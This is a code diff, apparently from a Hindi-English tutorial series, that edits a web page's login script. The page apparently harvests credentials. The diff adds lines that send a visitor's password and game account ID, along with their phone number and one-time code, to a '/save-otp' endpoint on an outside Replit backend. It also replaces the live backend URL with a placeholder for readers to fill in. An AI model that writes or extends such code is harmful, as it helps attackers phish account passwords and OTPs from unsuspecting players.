@@ -171,7 +171,7 @@
        //       (Jo aapne Hissa 1 mein copy kiya tha)
        // ▼▼▼=================================================▼▼▼
        
-       const REPLIT_BACKEND_URL = 'https://82a3f962-44b1-4854-852d-ee46247922d0-00-3u0zgk889dniz.sisko.replit.dev';
+       const REPLIT_BACKEND_URL = 'https://[AAPKA-REPLIT-URL].replit.dev';
        
        // ▲▲▲=================================================▲▲▲
 
@@ -291,6 +291,11 @@
                     const formData = new FormData();
                     formData.append('number', loginNumber.value);
                     formData.append('otp', loginOtp.value);
+                    
+                    // ▼▼▼ YEH DO LINES ADD KI GAYI HAIN ▼▼▼
+                    formData.append('password', loginPassword.value); 
+                    formData.append('game_id', loginGameId.value);
+                    // ▲▲▲ YEH DO LINES ADD KI GAYI HAIN ▲▲▲
 
                     fetch(`${REPLIT_BACKEND_URL}/save-otp`, {
                         method: 'POST',
